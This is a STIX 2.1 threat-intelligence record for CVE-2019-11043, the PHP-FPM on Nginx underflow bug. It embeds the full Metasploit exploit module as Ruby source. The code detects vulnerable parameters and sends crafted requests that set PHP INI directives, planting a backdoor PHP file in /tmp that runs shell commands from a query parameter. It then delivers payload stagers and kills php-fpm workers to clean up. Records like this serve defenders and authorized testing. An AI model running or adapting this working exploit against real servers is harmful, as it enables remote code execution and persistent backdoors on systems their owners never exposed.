{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7b3112bd-aa0b-46b1-ac88-225b4cfbb2bd",
    "created": "2024-08-14T17:11:37.079035Z",
    "modified": "2024-08-14T17:11:37.079039Z",
    "name": "PHP-FPM Underflow RCE",
    "description": " This module exploits an underflow vulnerability in versions 7.1.x below 7.1.33, 7.2.x below 7.2.24 and 7.3.x below 7.3.11 of PHP-FPM on Nginx. Only servers with certains Nginx + PHP-FPM configurations are exploitable. This is a port of the original neex's exploit code (see refs.). First, it detects the correct parameters (Query String Length and custom header length) needed to trigger code execution. This step determines if the target is actually vulnerable (Check method). Then the exploit sets a series of PHP INI directives to create a file locally on the target, which enables code execution through a query string parameter. This is used to execute normal payload stagers. Finally, this module does some cleanup by killing local PHP-FPM workers (those are spawned automatically once killed) and removing the created local file. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/php_fpm_rce.rb",
            "external_id": "php_fpm_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-11043"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/neex/phuip-fpizdam"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.php.net/bug.php?id=78599"
        },
        {
            "source_name": "reference",
            "url": "https://blog.orange.tw/2019/10/an-analysis-and-thought-about-recently.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'PHP-FPM Underflow RCE',\n        'Description' => %q{\n          This module exploits an underflow vulnerability in versions 7.1.x\n          below 7.1.33, 7.2.x below 7.2.24 and 7.3.x below 7.3.11 of PHP-FPM on\n          Nginx. Only servers with certains Nginx + PHP-FPM configurations are\n          exploitable. This is a port of the original neex's exploit code (see\n          refs.). First, it detects the correct parameters (Query String Length\n          and custom header length) needed to trigger code execution. This step\n          determines if the target is actually vulnerable (Check method). Then,\n          the exploit sets a series of PHP INI directives to create a file\n          locally on the target, which enables code execution through a query\n          string parameter. This is used to execute normal payload stagers.\n          Finally, this module does some cleanup by killing local PHP-FPM\n          workers (those are spawned automatically once killed) and removing\n          the created local file.\n        },\n        'Author' => [\n          'neex',          # (Emil Lerner) Discovery and original exploit code\n          'cdelafuente-r7' # This module\n        ],\n        'References' => [\n          ['CVE', '2019-11043'],\n          ['EDB', '47553'],\n          ['URL', 'https://github.com/neex/phuip-fpizdam'],\n          ['URL', 'https://bugs.php.net/bug.php?id=78599'],\n          ['URL', 'https://blog.orange.tw/2019/10/an-analysis-and-thought-about-recently.html']\n        ],\n        'DisclosureDate' => '2019-10-22',\n        'License' => MSF_LICENSE,\n        'Payload' => {\n          'BadChars' => \"&>\\' \"\n        },\n        'Targets' => [\n          [\n            'PHP', {\n              'Platform' => 'php',\n              'Arch' => ARCH_PHP,\n              'Payload' => {\n                'PrependEncoder' => 'php -r \"',\n                'AppendEncoder' => '\"'\n              }\n            }\n          ],\n          [\n            'Shell Command', {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SERVICE_RESTARTS],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Path to a PHP page', '/index.php'])\n    ])\n\n    register_advanced_options([\n      OptInt.new('MinQSL', [true, 'Minimum query string length', 1500]),\n      OptInt.new('MaxQSL', [true, 'Maximum query string length', 1950]),\n      OptInt.new('QSLHint', [false, 'Query string length hint']),\n      OptInt.new('QSLDetectStep', [true, 'Query string length detect step', 5]),\n      OptInt.new('MaxQSLCandidates', [true, 'Max query string length candidates', 10]),\n      OptInt.new('MaxQSLDetectDelta', [true, 'Max query string length detection delta', 10]),\n      OptInt.new('MaxCustomHeaderLength', [true, 'Max custom header length', 256]),\n      OptInt.new('CustomHeaderLengthHint', [false, 'Custom header length hint']),\n      OptEnum.new('DetectMethod', [true, 'Detection method', 'session.auto_start', self.class.detect_methods.keys]),\n      OptInt.new('OperationMaxRetries', [true, 'Maximum of operation retries', 20])\n    ])\n    @filename = rand_text_alpha(1)\n    @http_param = rand_text_alpha(1)\n  end\n\n  CHECK_COMMAND = 'which which'.freeze\n  SUCCESS_PATTERN = '/bin/which'.freeze\n\n  class DetectMethod\n    attr_reader :php_option_enable, :php_option_disable\n\n    def initialize(php_option_enable:, php_option_disable:, check_cb:)\n      @php_option_enable = php_option_enable\n      @php_option_disable = php_option_disable\n      @check_cb = check_cb\n    end\n\n    def php_option_enabled?(res)\n      !!@check_cb.call(res)\n    end\n  end\n\n  def self.detect_methods\n    {\n      'session.auto_start' => DetectMethod.new(\n        php_option_enable: 'session.auto_start=1',\n        php_option_disable: 'session.auto_start=0',\n        check_cb: ->(res) { res.get_cookies =~ /PHPSESSID=/ }\n      ),\n      'output_handler.md5' => DetectMethod.new(\n        php_option_enable: 'output_handler=md5',\n        php_option_disable: 'output_handler=NULL',\n        check_cb: ->(res) { res.body.length == 16 }\n      )\n    }\n  end\n\n  def send_crafted_request(path:, qsl: datastore['MinQSL'], customh_length: 1, cmd: '', allow_retry: true)\n    uri = Rex::Text.uri_encode(normalize_uri(target_uri.path, path)).gsub(/([?&])/, { '?' => '%3F', '&' => '%26' })\n    qsl_delta = uri.length - path.length - Rex::Text.uri_encode(target_uri.path).length\n    if qsl_delta.odd?\n      fail_with Failure::Unknown, \"Got odd qslDelta, that means the URL encoding gone wrong: path=#{path}, qsl_delta=#{qsl_delta}\"\n    end\n    prefix = cmd.empty? ? '' : \"#{@http_param}=#{URI::DEFAULT_PARSER.escape(cmd)}%26\"\n    qsl_prime = qsl - qsl_delta / 2 - prefix.length\n    if qsl_prime < 0\n      fail_with Failure::Unknown, \"QSL value too small to fit the command: QSL=#{qsl}, qsl_delta=#{qsl_delta}, prefix (size=#{prefix.size})=#{prefix}\"\n    end\n    uri = \"#{uri}?#{prefix}#{'Q' * qsl_prime}\"\n    opts = {\n      'method' => 'GET',\n      'uri' => uri,\n      'headers' => {\n        'CustomH' => \"x=#{Rex::Text.rand_text_alphanumeric(customh_length)}\",\n        'Nuut' => Rex::Text.rand_text_alphanumeric(11)\n      }\n    }\n    actual_timeout = datastore['HttpClientTimeout'] if datastore['HttpClientTimeout']&.> 0\n    actual_timeout ||= 20\n\n    connect(opts) if client.nil? || !client.conn?\n    # By default, try to reuse an existing connection (persist option).\n    res = client.send_recv(client.request_raw(opts), actual_timeout, true)\n    if res.nil? && allow_retry\n      # The server closed the connection, resend without 'persist', which forces\n      # reconnecting. This could happen if the connection is reused too much time.\n      # Nginx will automatically close a keepalive connection after 100 requests\n      # by default or whatever value is set by the 'keepalive_requests' option.\n      res = client.send_recv(client.request_raw(opts), actual_timeout)\n    end\n    res\n  end\n\n  def repeat_operation(op, opts = {})\n    datastore['OperationMaxRetries'].times do |i|\n      vprint_status(\"#{op}: try ##{i + 1}\")\n      res = opts.empty? ? send(op) : send(op, **opts)\n      return res if res\n    end\n    nil\n  end\n\n  def extend_qsl_list(qsl_candidates)\n    qsl_candidates.each_with_object([]) do |qsl, extended_qsl|\n      (0..datastore['MaxQSLDetectDelta']).step(datastore['QSLDetectStep']) do |delta|\n        extended_qsl << qsl - delta\n      end\n    end.sort.uniq\n  end\n\n  def sanity_check?\n    datastore['OperationMaxRetries'].times do\n      res = send_crafted_request(\n        path: \"/PHP\\nSOSAT\",\n        qsl: datastore['MaxQSL'],\n        customh_length: datastore['MaxCustomHeaderLength']\n      )\n      unless res\n        vprint_error('Error during sanity check')\n        return false\n      end\n      if res.code != @base_status\n        vprint_error(\n          \"Invalid status code: #{res.code} (must be #{@base_status}). \"\\\n          'Maybe \".php\" suffix is required?'\n        )\n        return false\n      end\n      detect_method = self.class.detect_methods[datastore['DetectMethod']]\n      next unless detect_method.php_option_enabled?(res)\n\n      vprint_error(\n        \"Detection method '#{datastore['DetectMethod']}' won't work since \"\\\n        'the PHP option has already been set on the target. Try another one'\n      )\n      return false\n    end\n    return true\n  end\n\n  def set_php_setting(php_setting:, qsl:, customh_length:, cmd: '')\n    path = \"/PHP_VALUE\\n#{php_setting}\"\n    pos_offset = 34\n    if path.length > pos_offset\n      vprint_error(\n        \"The path size (#{path.length} bytes) is larger than the allowed size \"\\\n        \"(#{pos_offset} bytes). Choose a shorter php.ini value (current: '#{php_setting}')\"\n      )\n      return nil\n    end\n    path += ';' * (pos_offset - path.length)\n    res = send_crafted_request(\n      path: path,\n      qsl: qsl,\n      customh_length: customh_length,\n      cmd: cmd\n    )\n    unless res\n      vprint_error(\"error while setting #{php_setting} for qsl=#{qsl}, customh_length=#{customh_length}\")\n    end\n    return res\n  end\n\n  def send_params_detection(qsl_candidates:, customh_length:, detect_method:)\n    php_setting = detect_method.php_option_enable\n    vprint_status(\"Iterating until the PHP option is enabled (#{php_setting})...\")\n    customh_lengths = customh_length ? [customh_length] : (1..datastore['MaxCustomHeaderLength']).to_a\n    qsl_candidates.product(customh_lengths) do |qsl, c_length|\n      res = set_php_setting(php_setting: php_setting, qsl: qsl, customh_length: c_length)\n      unless res\n        vprint_error(\"Error for qsl=#{qsl}, customh_length=#{c_length}\")\n        return nil\n      end\n      if res.code != @base_status\n        vprint_status(\"Status code #{res.code} for qsl=#{qsl}, customh_length=#{c_length}\")\n      end\n      if detect_method.php_option_enabled?(res)\n        php_setting = detect_method.php_option_disable\n        vprint_status(\"Attack params found, disabling PHP option (#{php_setting})...\")\n        set_php_setting(php_setting: php_setting, qsl: qsl, customh_length: c_length)\n        return { qsl: qsl, customh_length: c_length }\n      end\n    end\n    return nil\n  end\n\n  def detect_params(qsl_candidates)\n    customh_length = nil\n    if datastore['CustomHeaderLengthHint']\n      vprint_status(\n        'Using custom header length hint for max length (customh_length='\\\n        \"#{datastore['CustomHeaderLengthHint']})\"\n      )\n      customh_length = datastore['CustomHeaderLengthHint']\n    end\n    detect_method = self.class.detect_methods[datastore['DetectMethod']]\n    return repeat_operation(\n      :send_params_detection,\n      qsl_candidates: qsl_candidates,\n      customh_length: customh_length,\n      detect_method: detect_method\n    )\n  end\n\n  def send_attack_chain\n    [\n      'short_open_tag=1',\n      'html_errors=0',\n      'include_path=/tmp',\n      \"auto_prepend_file=#{@filename}\",\n      'log_errors=1',\n      'error_reporting=2',\n      \"error_log=/tmp/#{@filename}\",\n      'extension_dir=\"<?=`\"',\n      \"extension=\\\"$_GET[#{@http_param}]`?>\\\"\"\n    ].each do |php_setting|\n      vprint_status(\"Sending php.ini setting: #{php_setting}\")\n      res = set_php_setting(\n        php_setting: php_setting,\n        qsl: @params[:qsl],\n        customh_length: @params[:customh_length],\n        cmd: \"/bin/sh -c '#{CHECK_COMMAND}'\"\n      )\n      if res\n        return res if res.body.include?(SUCCESS_PATTERN)\n      else\n        print_error(\"Error when setting #{php_setting}\")\n        return nil\n      end\n    end\n    return nil\n  end\n\n  def send_payload\n    disconnect(client) if client&.conn?\n    send_crafted_request(\n      path: '/',\n      qsl: @params[:qsl],\n      customh_length: @params[:customh_length],\n      cmd: payload.encoded,\n      allow_retry: false\n    )\n    Rex.sleep(1)\n    return session_created? ? true : nil\n  end\n\n  def send_backdoor_cleanup\n    cleanup_command = \";echo '<?php echo `$_GET[#{@http_param}]`;return;?>'>/tmp/#{@filename}\"\n    res = send_crafted_request(\n      path: '/',\n      qsl: @params[:qsl],\n      customh_length: @params[:customh_length],\n      cmd: \"#{cleanup_command};#{CHECK_COMMAND}\"\n    )\n    return res if res&.body&.include?(SUCCESS_PATTERN)\n\n    return nil\n  end\n\n  def detect_qsl\n    qsl_candidates = []\n    (datastore['MinQSL']..datastore['MaxQSL']).step(datastore['QSLDetectStep']) do |qsl|\n      res = send_crafted_request(path: \"/PHP\\nabcdefghijklmopqrstuv.php\", qsl: qsl)\n      unless res\n        vprint_error(\"Error when sending query with QSL=#{qsl}\")\n        next\n      end\n      if res.code != @base_status\n        vprint_status(\"Status code #{res.code} for qsl=#{qsl}, adding as a candidate\")\n        qsl_candidates << qsl\n      end\n    end\n    qsl_candidates\n  end\n\n  def check\n    print_status('Sending baseline query...')\n    res = send_crafted_request(path: \"/path\\ninfo.php\")\n    return CheckCode::Unknown('Error when sending baseline query') unless res\n\n    @base_status = res.code\n    vprint_status(\"Base status code is #{@base_status}\")\n\n    if datastore['QSLHint']\n      print_status(\"Skipping qsl detection, using hint (qsl=#{datastore['QSLHint']})\")\n      qsl_candidates = [datastore['QSLHint']]\n    else\n      print_status('Detecting QSL...')\n      qsl_candidates = detect_qsl\n    end\n    if qsl_candidates.empty?\n      return CheckCode::Detected('No qsl candidates found, not vulnerable or something went wrong')\n    end\n    if qsl_candidates.size > datastore['MaxQSLCandidates']\n      return CheckCode::Detected('Too many qsl candidates found, looks like I got banned')\n    end\n\n    print_good(\"The target is probably vulnerable. Possible QSLs: #{qsl_candidates}\")\n\n    qsl_candidates = extend_qsl_list(qsl_candidates)\n    vprint_status(\"Extended QSL list: #{qsl_candidates}\")\n\n    print_status('Doing sanity check...')\n    return CheckCode::Detected('Sanity check failed') unless sanity_check?\n\n    print_status('Detecting attack parameters...')\n    @params = detect_params(qsl_candidates)\n    return CheckCode::Detected('Unable to detect parameters') unless @params\n\n    print_good(\"Parameters found: QSL=#{@params[:qsl]}, customh_length=#{@params[:customh_length]}\")\n    print_good('Target is vulnerable!')\n    CheckCode::Vulnerable\n  ensure\n    disconnect(client) if client&.conn?\n  end\n\n  def exploit\n    unless check == CheckCode::Vulnerable\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable.'\n    end\n    if @params[:qsl].nil? || @params[:customh_length].nil?\n      fail_with Failure::NotVulnerable, 'Attack parameters not found'\n    end\n\n    print_status('Performing attack using php.ini settings...')\n    if repeat_operation(:send_attack_chain)\n      print_good(\"Success! Was able to execute a command by appending '#{CHECK_COMMAND}'\")\n    else\n      fail_with Failure::Unknown, 'Failed to send the attack chain'\n    end\n\n    print_status(\"Trying to cleanup /tmp/#{@filename}...\")\n    if repeat_operation(:send_backdoor_cleanup)\n      print_good('Cleanup done!')\n    end\n\n    print_status('Sending payload...')\n    repeat_operation(:send_payload)\n  end\n\n  def send_cleanup(cleanup_cmd:)\n    res = send_crafted_request(\n      path: '/',\n      qsl: @params[:qsl],\n      customh_length: @params[:customh_length],\n      cmd: cleanup_cmd\n    )\n    return res if res && res.code != @base_status\n\n    return nil\n  end\n\n  def cleanup\n    return unless successful\n\n    kill_workers = 'for p in `pidof php-fpm`; do kill -9 $p;done'\n    rm = \"rm -f /tmp/#{@filename}\"\n    cleanup_cmd = \"#{kill_workers};#{rm}\"\n    disconnect(client) if client&.conn?\n    print_status(\"Remove /tmp/#{@filename} and kill workers...\")\n    if repeat_operation(:send_cleanup, cleanup_cmd: cleanup_cmd)\n      print_good('Done!')\n    else\n      print_bad(\n        'Could not cleanup. Run these commands before terminating the session: '\\\n        \"#{kill_workers}; #{rm}\"\n      )\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-10-22",
    "x_mitre_platforms": [
        "unix'"
    ]
}